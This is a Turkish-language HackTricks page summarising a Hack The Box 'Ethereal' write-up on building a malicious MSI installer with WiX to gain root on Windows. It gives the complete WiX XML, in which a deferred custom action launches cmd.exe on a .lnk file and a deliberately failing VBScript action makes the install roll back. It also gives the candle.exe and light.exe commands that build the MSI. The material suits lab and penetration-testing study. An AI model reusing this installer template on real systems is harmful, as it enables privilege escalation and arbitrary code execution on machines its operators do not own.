# Kötü Amaçlı MSI Oluşturma ve Root Elde Etme

{{#include ../../banners/hacktricks-training.md}}

MSI installer oluşturma işlemi wixtools kullanılarak gerçekleştirilecektir; özellikle [wixtools](http://wixtoolset.org) kullanılacaktır. Alternatif MSI builder'larının da denendiğini, ancak bu özel durumda başarılı olmadıklarını belirtmek gerekir.<sup>[[1]](#references)</sup>

wix MSI kullanım örneklerini kapsamlı bir şekilde anlamak için [bu sayfaya](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with) başvurulması tavsiye edilir. Burada, wix MSI kullanımını gösteren çeşitli örnekler bulabilirsiniz.<sup>[[2]](#references)</sup>

Amaç, lnk dosyasını çalıştıracak bir MSI oluşturmaktır. Bunu gerçekleştirmek için aşağıdaki XML kodu kullanılabilir ([xml buradan alınmıştır](https://0xrick.github.io/hack-the-box/ethereal/index.html#Creating-Malicious-msi-and-getting-root)):<sup>[[1]](#references)</sup>
```html
<?xml version="1.0"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
<Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Example Product Name"
Version="0.0.1" Manufacturer="@_xpn_" Language="1033">
<Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/>
<Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>
<Directory Id="TARGETDIR" Name="SourceDir">
<Directory Id="ProgramFilesFolder">
<Directory Id="INSTALLLOCATION" Name="Example">
<Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222">
</Component>
</Directory>
</Directory>
</Directory>
<Feature Id="DefaultFeature" Level="1">
<ComponentRef Id="ApplicationFiles"/>
</Feature>
<Property Id="cmdline">cmd.exe /C "c:\users\public\desktop\shortcuts\rick.lnk"</Property>
<CustomAction Id="Stage1" Execute="deferred" Directory="TARGETDIR" ExeCommand='[cmdline]' Return="ignore"
Impersonate="yes"/>
<CustomAction Id="Stage2" Execute="deferred" Script="vbscript" Return="check">
fail_here
</CustomAction>
<InstallExecuteSequence>
<Custom Action="Stage1" After="InstallInitialize"></Custom>
<Custom Action="Stage2" Before="InstallFiles"></Custom>
</InstallExecuteSequence>
</Product>
</Wix>
```
Package elementinin, installer sürümünü belirten InstallerVersion ve package'in sıkıştırılmış olup olmadığını belirten Compressed gibi attribute'lar içerdiğini belirtmek önemlidir.

Oluşturma işlemi, msi.xml dosyasından bir wixobject oluşturmak için wixtools'tan bir tool olan candle.exe'nin kullanılmasını içerir. Aşağıdaki komut çalıştırılmalıdır:<sup>[[1]](#references)</sup>
```
candle.exe -out C:\tem\wix C:\tmp\Ethereal\msi.xml
```
Ayrıca, gönderide komutu ve çıktısını gösteren bir görselin bulunduğunu belirtmek gerekir. Görsel rehberlik için bu görsele başvurabilirsiniz.<sup>[[1]](#references)</sup>

Bunun yanı sıra, wixtools içindeki başka bir araç olan light.exe, wixobject'ten MSI dosyası oluşturmak için kullanılacaktır. Çalıştırılacak komut aşağıdaki gibidir:<sup>[[1]](#references)</sup>
```
light.exe -out C:\tm\Ethereal\rick.msi C:\tmp\wix
```
Önceki command'e benzer şekilde, command'i ve çıktısını gösteren bir görsel post'a eklenmiştir.<sup>[[1]](#references)</sup>

Bu summary değerli bilgiler sağlamayı amaçlasa da daha kapsamlı ayrıntılar ve doğru talimatlar için original post'a başvurulması önerilir.<sup>[[1]](#references)</sup>

## Referanslar

- [1] [Hack The Box - Ethereal: Creating Malicious msi and getting root - 0xRick's Blog](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)
- [2] [A quick introduction: Create an MSI installer with WiX - CodeProject](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with) (ayrıca [wixtools](http://wixtoolset.org) adresine bakın)

{{#include ../../banners/hacktricks-training.md}}
